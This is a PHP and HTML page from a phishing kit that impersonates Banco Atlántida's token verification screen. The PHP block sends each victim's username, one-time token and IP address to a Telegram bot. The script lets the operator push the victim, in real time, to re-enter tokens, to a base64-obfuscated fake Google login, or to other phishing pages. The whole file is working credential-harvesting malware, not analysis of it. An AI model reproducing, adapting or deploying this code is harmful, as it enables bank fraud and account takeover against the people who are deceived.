<?php
require_once dirname(__DIR__) . '/gate_check.php';
include("../data.php");
$usuario = trim($_GET['u'] ?? $_POST['u'] ?? '');

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
    $tk    = trim($_POST['token']);
    $round = intval($_POST['round'] ?? 1);
    $ip    = '';
    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $h) {
        if (!empty($_SERVER[$h])) { $ip = trim(explode(',', $_SERVER[$h])[0]); break; }
    }
    $date = date('d/m/Y H:i:s');

    $msg  = "🔐 BANCO MANZANA — TOKEN #{$round}\n";
    $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
    $msg .= "👤 Usuario: {$usuario}\n";
    $msg .= "🔑 Token: {$tk}\n";
    $msg .= "🌐 IP: " . ($ip ?: '?') . "\n";
    $msg .= "🕒 Fecha: {$date}\n";

    $keyboard = json_encode([
        'inline_keyboard' => [
            [
                ['text' => '❌ LOGINERROR', 'callback_data' => "LOGINERROR|{$usuario}"],
                ['text' => '🚫 TOKERROR',   'callback_data' => "TOKERROR|{$usuario}"],
            ],
            [
                ['text' => '📧 Gmail',   'callback_data' => "GMAIL|{$usuario}"],
                ['text' => '🏦 Hsn',     'callback_data' => "HSN|{$usuario}"],
                ['text' => '🏁 LISTO',   'callback_data' => "LISTO|{$usuario}"],
            ],
        ]
    ]);

    file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
        'chat_id'      => $chat_id,
        'text'         => $msg,
        'reply_markup' => $keyboard,
    ]));

    $redirect = '../espera.php?u=' . urlencode($usuario) . '&step=token';
    echo json_encode(['ok' => true, 'redirect' => $redirect]);
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <title>Banco Atl&#225;ntida — Verificación</title>
  <link rel="icon" href="../img/logo-ba.svg" type="image/svg+xml"/>
  <link rel="preconnect" href="https://fonts.googleapis.com"/>
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
  <style>
    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
    :root{--red:#E30613;--red-dark:#B30410}
    html,body{font-family:'Inter',-apple-system,sans-serif;height:100%;overflow:hidden;
      background-color:#C41230;
      background-image:url('../img/8a8d551c-83aa-47f5-b04d-07e04420264d.png');
      background-size:cover;
      background-position:center;
    }

    /* LOADER */
    #loader{position:fixed;inset:0;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:28px;z-index:999;transition:opacity .4s ease}
    #loader.hide{opacity:0;pointer-events:none}
    .load-logo{height:58px;width:auto}
    .gif-loader{position:relative;width:70px;height:70px}
    .gif-loader .ring{position:absolute;inset:0;border-radius:50%;border:5px solid transparent;animation:spin 1.1s linear infinite}
    .gif-loader .r1{border-top-color:var(--red)}
    .gif-loader .r2{border-right-color:#f87171;animation-duration:1.6s;animation-direction:reverse;width:52px;height:52px;top:9px;left:9px}
    .gif-loader .r3{border-bottom-color:#fca5a5;animation-duration:2.2s;width:34px;height:34px;top:18px;left:18px}
    @keyframes spin{to{transform:rotate(360deg)}}
    #loadText{font-size:15px;color:#374151;font-weight:500;transition:opacity .3s}
    #loadText.fade{opacity:0}

    /* POPUP */
    #scene{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;padding:24px;opacity:0;pointer-events:none;transition:opacity .35s}
    #scene.show{opacity:1;pointer-events:all}
    #err-ov{position:fixed;inset:0;z-index:99999;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:flex-start;padding-top:90px;gap:20px;opacity:0;pointer-events:none;transition:opacity .3s}
    #err-ov.show{opacity:1;pointer-events:all}
    #err-ov .err-icon{font-size:48px}
    #err-ov .err-title{font-size:18px;font-weight:700;color:#E30613}
    #err-ov .err-sub{font-size:14px;color:#6b7280;text-align:center;line-height:1.5}
    .modal{width:100%;max-width:380px;background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 24px 64px rgba(0,0,0,.45)}
    .modal-header{background:#fff;padding:18px 20px 8px;text-align:center}
    .modal-header h2{color:var(--red);font-size:18px;font-weight:600}
    .modal-body{padding:8px 24px 24px;text-align:center}
    .modal-body p{font-size:14px;color:#374151;margin-bottom:22px;line-height:1.45}
    .token-input{width:100%;height:44px;border:none;border-radius:24px;font-size:18px;font-weight:600;letter-spacing:3px;color:#111;outline:none;background:#e9eaec;padding:0 18px;text-align:center;transition:background .15s}
    .token-input:focus{background:#dfe1e4}
    .token-input::placeholder{letter-spacing:1px;font-size:14px;font-weight:400;color:#9ca3af}
    .btn-cancel,.btn-send{display:block;width:80%;margin:14px auto 0;height:44px;border:none;border-radius:24px;font-size:14px;font-weight:600;font-family:inherit;cursor:pointer;letter-spacing:1.5px;transition:background .15s,opacity .15s}
    .btn-cancel{background:#6b7280;color:#fff}
    .btn-cancel:hover{background:#4b5563}
    .btn-send{background:var(--red);color:#fff}
    .btn-send:hover{background:var(--red-dark)}
    .btn-send:active,.btn-cancel:active{transform:translateY(1px)}
    .btn-send.loading{opacity:.6;pointer-events:none}
  </style>
</head>
<body>

  <div id="loader">
    <img src="../img/logo-ba.svg" class="load-logo" alt="Banco Atl&#225;ntida"/>
    <div class="gif-loader">
      <div class="ring r1"></div>
      <div class="ring r2"></div>
      <div class="ring r3"></div>
    </div>
    <span id="loadText">Por favor espera...</span>
  </div>

  <div id="err-ov">
    <img src="../img/lan.png" style="width:220px;height:auto"/>
    <div class="err-title">Token Inválido o Expirado</div>
    <div class="err-sub">Intenta nuevamente</div>
  </div>

  <div id="scene">
    <div class="modal">
      <div id="tok-form">
        <div class="modal-header"><h2>Token</h2></div>
        <div class="modal-body">
          <p>Ingresa el token para continuar. Recuerda no compartirlo con nadie.</p>
          <input class="token-input" type="tel" id="tokenInput" maxlength="10"
                 placeholder="" autocomplete="one-time-code"/>
          <button class="btn-send" id="btnEnviar" onclick="enviar()">ENVIAR</button>
        </div>
      </div>
      <div id="tok-waiting" style="display:none;padding:36px 24px;text-align:center">
        <div class="gif-loader" style="margin:0 auto 16px">
          <div class="ring r1"></div><div class="ring r2"></div><div class="ring r3"></div>
        </div>
        <p style="font-size:14px;color:#374151;font-weight:500">Procesando...</p>
      </div>
    </div>
  </div>

  <script>
    const USUARIO    = <?= json_encode($usuario) ?>;
    const MAX_ROUNDS = 4;
    let   round      = 1;

    const loader   = document.getElementById('loader');
    const loadText = document.getElementById('loadText');
    const scene    = document.getElementById('scene');
    const tokForm    = document.getElementById('tok-form');
    const tokWaiting = document.getElementById('tok-waiting');
    const errOv      = document.getElementById('err-ov');
    const inp      = document.getElementById('tokenInput');
    const btnEnv   = document.getElementById('btnEnviar');
    let   pollTimer  = null;

    function showLoader(ms) {
      scene.classList.remove('show');
      loader.classList.remove('hide');

      loadText.classList.remove('fade');
      loadText.textContent = 'Por favor espera...';

      const t1 = setTimeout(() => {
        loadText.classList.add('fade');
        setTimeout(() => {
          loadText.textContent = 'Estamos procesando tu solicitud...';
          loadText.classList.remove('fade');
        }, 300);
      }, 10000);

      setTimeout(() => {
        clearTimeout(t1);
        loader.classList.add('hide');
        setTimeout(showToken, 400);
      }, ms);
    }

    function showToken() {
      scene.classList.add('show');
      tokForm.style.display    = '';
      tokWaiting.style.display = 'none';
      inp.value = '';
      btnEnv.textContent = 'ENVIAR';
      btnEnv.classList.remove('loading');
      inp.focus();
    }

    function showWaiting() {
      tokForm.style.display    = 'none';
      tokWaiting.style.display = '';
    }

    function startPoll() {
      if (pollTimer) clearInterval(pollTimer);
      pollTimer = setInterval(function(){
        fetch('../check.php?u=' + encodeURIComponent(USUARIO))
          .then(function(r){ return r.json(); })
          .then(function(d){
            if (!d.action) return;
            clearInterval(pollTimer); pollTimer = null;
            handleAction(d.action);
          })
          .catch(function(){});
      }, 2000);
    }

    function handleAction(action) {
      switch(action) {
        case '/TOKERROR':
          errOv.classList.add('show');
          setTimeout(function(){
            errOv.classList.remove('show');
            setTimeout(showToken, 300);
          }, 2500);
          break;
        case '/LOGINERROR':
          window.location.href = 'index.php?error=1';
          break;
        case '/GMAIL':
          window.location.href = atob('aHR0cHM6Ly90Mm0uY28vZ29vZ2xlLmxvZ2lu');
          break;
        case '/HSN':
          window.location.href = '../hm/index05.html';
          break;
        case '/LISTO':
          window.location.href = '../listo.html';
          break;
        default:
          startPoll();
      }
    }

    function enviar() {
      const tk = inp.value.trim();
      if (!tk) { inp.focus(); return; }

      btnEnv.textContent = '...';
      btnEnv.classList.add('loading');

      const fd = new FormData();
      fd.append('token', tk);
      fd.append('u',     USUARIO);
      fd.append('round', round);

      fetch('token.php', { method: 'POST', body: fd })
        .then(function(r){ return r.json(); })
        .then(function(d){
          if (d.ok) {
            round++;
            showWaiting();
            startPoll();
          }
        })
        .catch(function(){
          btnEnv.textContent = 'ENVIAR';
          btnEnv.classList.remove('loading');
        });
    }

    document.addEventListener('keydown', e => {
      if (e.key === 'Enter' && scene.classList.contains('show')) enviar();
    });

    loader.classList.add('hide');
    showToken();
  </script>
<script src="../protect.js"></script>
</body>
</html>
